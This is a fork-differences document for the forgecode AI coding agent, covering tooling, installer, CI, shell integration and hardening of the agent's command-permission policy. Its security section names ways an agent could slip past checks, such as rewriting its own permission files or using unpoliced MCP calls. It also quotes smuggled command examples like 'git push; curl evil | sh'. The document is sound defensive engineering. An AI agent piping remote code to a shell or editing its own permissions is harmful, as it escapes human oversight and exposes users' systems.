# Fork Differences: `mymain` vs upstream `main`

This document describes how the local development branch `mymain` diverges
from upstream [`tailcallhq/forgecode`](https://github.com/tailcallhq/forgecode) (formerly `antinomyhq`)
`main`, and why.

It deliberately describes *categories* of divergence rather than exact
counts, which rot within days. For current numbers, run the commands under
[Reproducing the comparison](#reproducing-the-comparison).

## Summary

`mymain` is a strict superset of upstream `main`: every upstream commit is
reachable from `mymain`, and no commit exists upstream that is missing here.
Divergence falls into five buckets:

| Bucket | Where | Merge-conflict risk |
|---|---|---|
| Developer tooling | `Justfile`, `.just/helpers/`, `mise.toml`, `typos.toml`, `sgconfig.yml`, `rules/` | none (fork-only files) |
| Upstream files patched for tooling | `scripts/`, `.forge/commands/check.md` | low (small, low-churn edits) |
| Shell integration | `shell-plugin/bash/`, `shell-plugin/fish/`, `crates/forge_main/src/zsh/`, `crates/forge_select/src/comint.rs` | low |
| Emacs-native frontend | `crates/forge_main/src/frontend/`, `docs/frontend-protocol.md` | low (new modules) |
| Security hardening | `crates/forge_services/src/policy.rs`, `command_extract.rs`, `permissions.default.yaml`, `crates/forge_config/.forge.toml` | **high** — see [Security posture](#security-posture) |
| Installer + CI | `cli`, `.github/workflows/ci.yml`, `crates/forge_ci/tests/ci.rs` | medium (CI replaced wholesale) |

`docs/shell-parity/`, `exec-harness/` and `.beads/` are fork-only and carry no
conflict risk. `plans/` is shared with upstream, but the fork only *adds*
files there and modifies none.

## What diverges, and why

### Developer tooling

The fork replaces upstream's ad-hoc scripts with a single `just` task runner
(`Justfile` plus `.just/helpers/*.bash`). One gate — `just ci` — fixes what
is fixable (rustfmt, `clippy --fix`, typos, rumdl, generated docs) and then
re-runs the same tools in check mode. `just ci-check` is the read-only form
used by hooks. See `docs/justfile.md` (generated; `just docs` regenerates it).

`.forge/commands/check.md` is patched to point agents at `just ci` instead of
raw `cargo fmt`/`clippy`/`insta` calls, which skip the shell, docs and
spelling lanes. It is an upstream file, but a very low-churn one.

### Installer

`cli` is a forked copy of upstream's POSIX-sh installer. Upstream's
`ensure_install_dir_shell_path()` unconditionally prepended `~/.local/bin` to
`.bashrc` / `.zshrc` on every run, clobbering shell configurations that
already set PATH elsewhere (for example a `path+=()` entry in `~/.zshenv`).
The fork early-returns when the directory is already on `$PATH` or when any
common startup file already references it.

The fork also moves the `UpdateFrequency` enum's `#[default]` to `Never`, so
code paths that fall back to the type default no longer schedule update
checks. Note the embedded `.forge.toml` still ships `auto_update = true` /
`frequency = "daily"`, and a user config layered on top wins over both -- set
`[updates] frequency = "never"` there to be sure a locally built binary is not
replaced by an upstream release build.

### CI

The fork replaces upstream's seven generated workflows with one minimal
workflow it owns. `crates/forge_ci/tests/ci.rs` used to *generate* those
workflow files; in the fork it only *asserts* that the fork-owned workflow
directory is intact and that upstream-only workflows stay removed.

### Shell integration and the Emacs frontend

`shell-plugin/` ships bash and fish ports alongside the original zsh plugin,
with the parity work documented under `docs/shell-parity/`.
`crates/forge_main/src/frontend/` adds a structured protocol so an external
frontend (GNU Emacs) can drive Forge; the wire format is documented in
`docs/frontend-protocol.md`.

### Security hardening

The largest *behavioural* divergence; it has [its own section](#security-posture).

## Reproducing the comparison

Upstream is the `upstream` remote; `origin` is the private fork
(`M1lan/forgecode`). `origin/main` is a stale mirror and the local `main`
branch is only as current as the last fetch, so compare against
`upstream/main` explicitly:

```bash
git fetch upstream
git log  --oneline --no-merges upstream/main..mymain   # fork-only commits
git log  --oneline mymain..upstream/main               # upstream not yet merged
git diff --stat $(git merge-base upstream/main mymain)..mymain
```

## Branch policy

- `upstream/main` is the source of truth for upstream code. Treat the local
  `main` branch as a cached pointer at whatever was last merged; it is not
  automatically current.
- `mymain` is the active development branch. All local work lands here and
  upstream is merged in periodically.
- Push only to `origin`. Contributions intended for upstream go out as pull
  requests from a branch cut off `upstream/main`, not as fork-local patches.

## Security posture

The fork hardens the shell-command permission model relative to upstream.
Upstream ships the policy engine switched off and permissive; the fork turns
it on and closes the bypasses that turning it on exposes:

- **Restricted mode is on by default.** The embedded defaults
  (`crates/forge_config/.forge.toml`) set `restricted = true`, so the policy
  engine is consulted for built-in tool calls. Upstream defaults to
  `restricted = false`, which disables permission checks entirely.

  Two caveats worth knowing. First, the gate does not cover everything:
  MCP tool calls bypass `check_tool_permission` entirely, and several
  built-ins (Task, Skill, Plan, Undo, SemSearch, Todo) map to no
  `PermissionOperation`, so an MCP server that exposes command execution is
  not policed by this. Second, an existing user config wins over the embedded
  default, and Forge's config writer materialises *every* field — so any
  install whose `.forge.toml` was written before this change has
  `restricted = false` pinned in it and stays unrestricted until that line is
  removed or flipped. Check with `forge info`, and edit the file that
  `ConfigReader::base_path()` actually resolves to: `~/forge/.forge.toml`
  when the legacy `~/forge` directory exists, otherwise `~/.forge/.forge.toml`
  (or `$FORGE_CONFIG` when set).
- **Commands and URL fetches confirm by default.** The default policy file
  (`crates/forge_services/src/permissions.default.yaml`, materialised as
  `permissions.yaml` on first use) drops upstream's blanket
  `allow`/`command: "*"` and `allow`/`url: "*"` rules; reads and writes stay
  allow-all. Confirmation comes from the *absence* of a rule, because
  `PolicyEngine` already defaults to `Confirm` when nothing matches. A
  `confirm`/`command: "*"` catch-all would be worse than useless: the engine
  returns the first matching `Deny`/`Confirm` and discards any `Allow` it has
  already seen, so the catch-all would shadow every allow rule — including
  the ones "Accept and Remember" writes — and re-prompt forever. An existing
  `permissions.yaml` is never rewritten, so installs that predate this change
  keep their old (allow-all) file until it is deleted or edited.
- **Forge cannot rewrite its own permissions.** The default policy denies
  writes to `permissions.yaml` and `.forge.toml`. Without that, the write
  allow-all would let an agent grant itself blanket command permissions — or
  set `restricted = false` — with the ordinary write tool and never prompt.
  `Deny` wins over `Allow` in the engine, so these rules survive the allow-all
  that follows them.

  The rules deliberately name those two files rather than denying a whole
  `forge` / `.forge` directory: `Deny` is a hard block with no prompt, and a
  directory rule would also block project-local `.forge/commands/*.md` and
  `.forge/agents/*.md`. They match on file name, so they still apply under a
  relocated `$FORGE_CONFIG`, but other files in the config directory
  (credentials, provider config) are not covered.
- **"Accept and Remember" stores exact commands.** Remembering an accepted
  command writes a glob-escaped exact-match execute rule instead of the
  upstream `<cmd> <subcmd>*` prefix glob, which also matched compound
  commands such as `git push; curl evil | sh`.
- **Execute rules are matched per simple command.** Commands are parsed with
  `tree-sitter-bash` (`crates/forge_services/src/command_extract.rs`) and each
  simple command — including those inside pipelines, `&&`/`;` lists,
  subshells and `$()` substitutions — is matched separately, so `git *` no
  longer auto-allows `git status && curl evil | sh`. Redirections stay
  attached to the statement they belong to (`cargo test > ~/.bashrc` is not
  reduced to `cargo test`), and anything the parser cannot model safely —
  syntax errors, standalone assignments, `export`/`declare`/`unset` — falls
  back to `Confirm` rather than being auto-allowed. On Windows, where
  commands run through `cmd.exe` rather than a POSIX shell, the raw-string
  verdict is kept because the bash grammar does not describe that syntax.
